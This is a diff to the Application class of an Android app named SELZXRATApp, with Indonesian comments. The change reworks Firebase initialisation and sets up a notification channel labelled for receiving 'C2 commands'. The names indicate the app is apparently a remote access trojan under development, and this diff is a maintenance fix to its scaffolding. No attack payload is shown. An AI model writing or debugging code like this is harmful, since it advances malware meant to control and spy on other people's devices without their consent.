@@ -5,8 +5,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.os.Build
 import android.util.Log
-import com.google.firebase.database.FirebaseDatabase
-import com.google.firebase.storage.FirebaseStorage
+import com.google.firebase.FirebaseApp
 
 class SELZXRATApp : Application() {
 
@@ -14,7 +13,6 @@ class SELZXRATApp : Application() {
         const val CHANNEL_ID = "selzxrat_c2_channel"
         const val CHANNEL_NAME = "SELZXRAT C2 Commands"
         lateinit var instance: SELZXRATApp
-            private set
     }
 
     override fun onCreate() {
@@ -22,25 +20,16 @@ class SELZXRATApp : Application() {
         instance = this
 
         try {
-            // Kita pakai FirebaseDatabase.getInstance() dulu
-            val db = FirebaseDatabase.getInstance()
+            // Inisialisasi Firebase tanpa Persistence dulu
+            // (Persistence bikin crash kalau service lain akses DB duluan)
+            FirebaseApp.initializeApp(this)
             
-            // Kita bungkus setPersistence dalam try-catch supaya kalau gagal, tidak crash
-            try {
-                db.setPersistenceEnabled(true)
-            } catch (e: Exception) {
-                Log.e("SELZXRATApp", "Persistence error (abaikan jika ini restart): ${e.message}")
-            }
-
-            // Inisialisasi Storage
-            FirebaseStorage.getInstance()
-            
+            // Create notification channel
+            createNotificationChannel()
         } catch (e: Exception) {
-            Log.e("SELZXRATApp", "Fatal Firebase Init: ${e.message}")
+            // Kalau ini error, berarti masalahnya di library Firebase/Google Services
+            Log.e("DEBUG_ERROR", "Gagal inisialisasi: ${e.message}")
         }
-
-        // Create notification channel
-        createNotificationChannel()
     }
 
     private fun createNotificationChannel() {
@@ -50,9 +39,7 @@ class SELZXRATApp : Application() {
                 CHANNEL_NAME,
                 NotificationManager.IMPORTANCE_HIGH
             ).apply {
-                description = "Channel for receiving C2 commands"
-                enableVibration(true)
-                setShowBadge(true)
+                description = "Channel for C2"
             }
             val manager = getSystemService(NotificationManager::class.java)
             manager?.createNotificationChannel(channel)
